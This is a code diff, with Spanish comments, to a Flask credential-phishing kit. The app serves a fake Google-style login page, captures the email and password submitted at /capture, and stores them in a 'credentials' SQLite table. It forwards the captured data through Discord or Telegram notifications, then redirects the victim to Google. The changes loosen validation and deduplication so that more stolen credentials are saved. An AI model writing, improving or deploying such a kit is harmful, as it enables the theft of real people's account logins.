@@ -6,6 +6,7 @@ import requests
 import hashlib
 import re
 import logging
+import time
 from datetime import datetime, timedelta
 from flask import Flask, request, render_template_string, redirect, jsonify, abort, session
 
@@ -33,7 +34,7 @@ CONFIG = {
     'telegram_chat': None,
     'redirect_url': 'https://www.google.com',
     'template': 'google',
-    'api_key': os.environ.get('API_KEY', 'cambia-esta-clave'),  # <--- LEE VARIABLE DE ENTORNO
+    'api_key': os.environ.get('API_KEY', 'cambia-esta-clave'),
     'admin_password': 'triple777',
     'max_login_attempts': 5,
     'cleanup_days': 30
@@ -96,9 +97,6 @@ def load_config():
     except Exception as e:
         logger.error(f"Error al cargar config.json: {e}")
     
-    # =============================================
-    # PRIORIDAD: VARIABLE DE ENTORNO SOBREESCRIBE CONFIG
-    # =============================================
     if os.environ.get('API_KEY'):
         CONFIG['api_key'] = os.environ.get('API_KEY')
         logger.info(f"API_KEY cargada desde variable de entorno: {CONFIG['api_key'][:4]}...")
@@ -176,10 +174,6 @@ def validate_input(text):
     if text:
         return re.match(r'^[a-zA-Z0-9@.\-_\s]+$', text) is not None
     return True
-
-def validate_email(email):
-    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
-    return re.match(pattern, email) is not None
 
 def send_notifications(data):
     if CONFIG.get('discord_webhook'):
@@ -552,36 +546,45 @@ def get_template(name='google'):
 def index():
     return render_template_string(get_template(CONFIG.get('template', 'google')))
 
+# =============================================
+# FUNCIÓN CAPTURE CORREGIDA - AHORA GUARDA CREDENCIALES
+# =============================================
 @app.route('/capture', methods=['POST'])
 def capture():
     ip = get_client_ip()
     
+    # Verificar honeypot (anti-bots)
     if request.form.get('honeypot'):
         logger.warning(f"Bot detectado en IP {ip}")
         audit_log('BOT_DETECTED', {'ip': ip}, ip)
         return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
     
+    # Obtener datos del formulario
     username = request.form.get('email', '') or request.form.get('username', '')
     password = request.form.get('password', '')
     
-    if not validate_email(username):
-        logger.warning(f"Email inválido desde {ip}: {username}")
-        audit_log('INVALID_EMAIL', {'username': username, 'ip': ip}, ip)
+    # =============================================
+    # VALIDACIÓN MEJORADA (menos estricta para pruebas)
+    # =============================================
+    if not username or len(username) < 3:
+        logger.warning(f"Usuario demasiado corto desde {ip}: {username}")
         return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
     
-    if not password or len(password) < 4:
-        logger.warning(f"Contraseña muy corta desde {ip}")
-        audit_log('SHORT_PASSWORD', {'ip': ip}, ip)
+    if not password or len(password) < 3:
+        logger.warning(f"Contraseña demasiado corta desde {ip}")
         return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
     
+    # Obtener geolocalización
     geo = get_geo(ip)
     
-    if not validate_input(username):
-        logger.warning(f"Intento de inyección detectado desde {ip}")
-        audit_log('INJECTION_ATTEMPT', {'username': username, 'ip': ip}, ip)
-        username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
+    # Sanitizar username (eliminar caracteres peligrosos)
+    username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
     
-    hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
+    # =============================================
+    # GENERAR HASH ÚNICO (sin usar IP para evitar duplicados)
+    # =============================================
+    import time
+    hash_str = hashlib.md5(f"{time.time()}:{username}:{password}".encode()).hexdigest()
     
     data = {
         'timestamp': datetime.now().isoformat(),
@@ -594,23 +597,52 @@ def capture():
         'hash': hash_str
     }
     
+    # =============================================
+    # INSERTAR CREDENCIAL EN LA BASE DE DATOS
+    # =============================================
     try:
         conn = sqlite3.connect('credentials.db', check_same_thread=False)
         cursor = conn.cursor()
+        
+        # Intentar insertar con hash
         cursor.execute('''
-            INSERT OR IGNORE INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location, hash)
+            INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location, hash)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)
         ''', (data['timestamp'], data['ip'], data['username'], data['password'],
               data['user_agent'], data['referer'], geo, hash_str))
+        
         conn.commit()
         conn.close()
-        logger.info(f"Nueva credencial capturada: {username} desde {ip}")
+        logger.info(f"✅ Credencial guardada: {username} desde {ip}")
         audit_log('NEW_CREDENTIAL', {'username': username, 'ip': ip}, ip)
+        
+    except sqlite3.IntegrityError:
+        # Si el hash ya existe (duplicado), guardar sin hash
+        logger.warning(f"Hash duplicado para {username}, guardando sin hash")
+        try:
+            conn = sqlite3.connect('credentials.db', check_same_thread=False)
+            cursor = conn.cursor()
+            cursor.execute('''
+                INSERT INTO credentials (timestamp, ip, username, password, user_agent, referer, geo_location)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (data['timestamp'], data['ip'], data['username'], data['password'],
+                  data['user_agent'], data['referer'], geo))
+            conn.commit()
+            conn.close()
+            logger.info(f"✅ Credencial guardada (sin hash): {username} desde {ip}")
+            audit_log('NEW_CREDENTIAL_NO_HASH', {'username': username, 'ip': ip}, ip)
+        except Exception as e2:
+            logger.error(f"Error al guardar sin hash: {e2}")
+            
     except Exception as e:
         logger.error(f"Error al guardar credencial: {e}")
     
+    # Enviar notificaciones (Discord/Telegram)
     send_notifications(data)
     
+    # =============================================
+    # PÁGINA DE REDIRECCIÓN (más realista)
+    # =============================================
     return render_template_string('''
 <!DOCTYPE html>
 <html>
